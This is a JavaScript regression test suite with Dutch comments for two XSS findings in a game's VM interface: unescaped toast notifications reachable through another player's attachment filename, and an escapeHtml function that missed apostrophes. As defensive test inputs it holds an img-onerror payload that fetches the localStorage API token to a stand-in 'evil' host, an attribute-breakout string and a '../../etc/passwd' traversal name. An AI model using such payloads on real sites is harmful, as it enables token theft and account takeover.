/**
 * XSS-oppervlaktes in de VM (headless) — bevindingen G-1 en G-3.
 *
 * WAT DEZE SUITE BEWAAKT, EN WAAROM HIJ APART STAAT
 * De VM rendert HTML met template literals en `innerHTML`. Dat is een keuze die
 * werkt zolang élke variabele door `escapeHtml` gaat, en die discipline is
 * projectbreed nageleefd — op één plek na. Deze suite legt de twee regels vast
 * die daar hoorden te gelden:
 *
 *   G-1  De toaststack (`components/Notifications.js`) rendert `title` en
 *        `message` ongeëscaped. Bereikbaar met inhoud van een ANDERE SPELER:
 *        de mailbijlage draagt zijn bestandsnaam mee tot in de melding
 *        "Attachment saved", en die naam komt ongefilterd van de afzender.
 *        Dat is de enige keten in het project waarin speler A code kan laten
 *        draaien in de browser van speler B — op het origin waar het
 *        API-token in localStorage staat.
 *
 *   G-3  `escapeHtml` escapete de apostrof niet. Vandaag onschadelijk (geen
 *        enkel attribuut in de VM gebruikt enkele quotes), en precies daarom
 *        het soort gat dat pas afgaat als iemand een attribuut anders schrijft.
 *        De regel hoort dus in een test te staan en niet in een gewoonte.
 *
 * DE TESTS DRAAIEN DE ECHTE FUNCTIES. Geen bronanalyse, geen grep op namen:
 * een naam in de bron bewijst niets over wat er gerenderd wordt.
 *
 * Run:  bash site/vm/tests/run.sh
 */
import { escapeHtml } from "../core/util.js";
import { renderNotificationItems, renderNotifications } from "../components/Notifications.js";
import { createMailAttachmentService } from "../core/mail/mailAttachmentService.js";

let failures = 0;
const okmsg = (m) => console.log("  PASS  " + m);
const fail = (m) => { console.log("  FAIL  " + m); failures++; };
const assert = (cond, m) => (cond ? okmsg(m) : fail(m));

console.log("\n=== XSS-oppervlaktes (G-1, G-3) ===\n");

// ---------------------------------------------------------------------------
// G-3 — escapeHtml dekt alle vijf de tekens
// ---------------------------------------------------------------------------
console.log("-- escapeHtml --");

assert(escapeHtml("<script>") === "&lt;script&gt;", "< en > worden geëscaped");
assert(escapeHtml('a"b') === "a&quot;b", "dubbele quote wordt geëscaped");
assert(escapeHtml("a'b") === "a&#39;b", "APOSTROF wordt geëscaped (G-3)");
assert(escapeHtml("a&b") === "a&amp;b", "ampersand wordt geëscaped");

// De volgorde doet ertoe: & moet als eerste, anders wordt de & van &lt; zelf
// nog eens geëscaped tot &amp;lt; en verschijnt de tekst letterlijk.
assert(escapeHtml("<") === "&lt;", "geen dubbele escaping van de ampersand");
assert(escapeHtml("&lt;") === "&amp;lt;",
    "al-geëscapete tekst wordt opnieuw geëscaped (geen idempotentie-aanname)");

// Een attribuut met ENKELE quotes moet nu ook dicht zitten. Dit is de vorm die
// vandaag nergens voorkomt en waar G-3 over ging.
const attr = `<a title='${escapeHtml("x' onmouseover='alert(1)")}'>`;
assert(!/onmouseover=/.test(attr.replace(/&#39;/g, "")) || attr.indexOf("' onmouseover") === -1,
    "een payload kan niet uit een enkel-gequote attribuut breken");

assert(escapeHtml(null) === "null" && escapeHtml(undefined) === "undefined",
    "escapeHtml werpt niet op null/undefined");

// ---------------------------------------------------------------------------
// G-1 — de toaststack escapet titel én bericht
// ---------------------------------------------------------------------------
console.log("\n-- de toaststack --");

const PAYLOAD = `<img src=x onerror="fetch('https://evil/?t='+localStorage.api_token)">`;

const uitTitel = renderNotificationItems({
    notifications: [{ id: "1", title: PAYLOAD, message: "ok" }]
});
assert(!uitTitel.includes("<img"), "een payload in de TITEL komt niet als tag door");
assert(uitTitel.includes("&lt;img"), "de titel wordt zichtbaar als tekst gerenderd");

const uitBericht = renderNotificationItems({
    notifications: [{ id: "1", title: "Attachment saved", message: PAYLOAD }]
});
assert(!uitBericht.includes("<img"), "een payload in het BERICHT komt niet als tag door");

// DE SCHERPE ASSERTIE, en de eerste versie hiervan was fout. Die zocht naar de
// tekst "onerror=" en die staat er nog — geëscaped, als leesbare tekst, en dat
// is precies goed. Escaping haalt de string niet weg, hij haalt de TAG weg.
// Wat je dus moet toetsen is dat er geen enkel `<` in de uitvoer staat dat niet
// van het sjabloon zelf komt.
const TEMPLATE_TAGS = /<\/?(div|strong|span)\b[^>]*>/g;
function vreemdeTags(html) {
    return (html.replace(TEMPLATE_TAGS, "").match(/</g) || []).length;
}
assert(vreemdeTags(uitBericht) === 0,
    "er staat geen enkele tag in de uitvoer die niet uit het sjabloon komt");

// De echte keten: het bericht is een PAD dat de bestandsnaam van een ander
// draagt. Precies wat MailApp.js doet na "save attachment".
const uitPad = renderNotificationItems({
    notifications: [{ id: "1", title: "Attachment saved",
                      message: `/mail/attachments/${PAYLOAD}.txt` }]
});
assert(!uitPad.includes("<img"),
    "G-1: een bijlagenaam van een andere speler kan geen tag openen");

// De wrapper mag het niet alsnog stukmaken.
const heel = renderNotifications({
    notifications: [{ id: "1", title: PAYLOAD, message: PAYLOAD }]
});
assert(!heel.includes("<img"), "renderNotifications geeft dezelfde garantie");
assert(heel.includes('class="vm-notifications"'), "de wrapper zelf blijft echte HTML");

// Lege stack blijft leeg — geen "undefined" in de DOM.
assert(renderNotificationItems({ notifications: [] }) === "",
    "een lege stack rendert een lege string");

// ---------------------------------------------------------------------------
// G-1 — de bestandsnaam wordt aan de BRON al schoongemaakt
// ---------------------------------------------------------------------------
console.log("\n-- de bijlagenaam --");

function fakeFs() {
    const geschreven = [];
    return {
        geschreven,
        isDir: () => true,
        mkdir: () => ({ ok: true }),
        write: (pad, inhoud) => { geschreven.push(pad); return { ok: true }; }
    };
}

function fakeStorage(filename) {
    return {
        readAttachment: () => ({ id: 7, filename, mime: "text/plain", content: "x" })
    };
}

function padVoor(filename) {
    const fs = fakeFs();
    const svc = createMailAttachmentService(fakeStorage(filename), fs);
    return svc.materialize(7);
}

const gevaarlijk = padVoor(`${PAYLOAD}.txt`);
assert(gevaarlijk.ok, "een bijlage met een rare naam wordt nog steeds opgeslagen");
assert(!/[<>"'&]/.test(gevaarlijk.path),
    "G-1 aan de bron: het pad draagt geen HTML-actieve tekens meer");
assert(gevaarlijk.path.startsWith("/mail/attachments/"),
    "het pad blijft in de bijlagemap");

// De bestaande garantie mag niet sneuvelen: slashes eruit, anders schrijft een
// bijlage buiten zijn eigen map.
const metSlash = padVoor("../../etc/passwd");
assert(metSlash.path.indexOf("/mail/attachments/") === 0
    && metSlash.path.lastIndexOf("/") === "/mail/attachments".length,
    "een naam met slashes kan niet uit de map ontsnappen");

// Een lege of onbruikbare naam valt terug op iets bruikbaars.
assert(padVoor("").path === "/mail/attachments/attachment_7.txt",
    "een lege naam valt terug op attachment_<id>.txt");
assert(padVoor("<<<>>>").path !== "/mail/attachments/",
    "een naam die volledig wordt weggefilterd valt óók terug");

// Een gewone naam blijft ongemoeid — de filter mag niet meer opruimen dan nodig.
assert(padVoor("firewall log 2026-08-07.txt").path
    === "/mail/attachments/firewall log 2026-08-07.txt",
    "een normale bestandsnaam wordt niet verminkt");

// ---------------------------------------------------------------------------
console.log(`\n=== ${failures === 0 ? "alle guards groen" : failures + " FOUT(EN)"} ===\n`);
process.exit(failures === 0 ? 0 : 1);
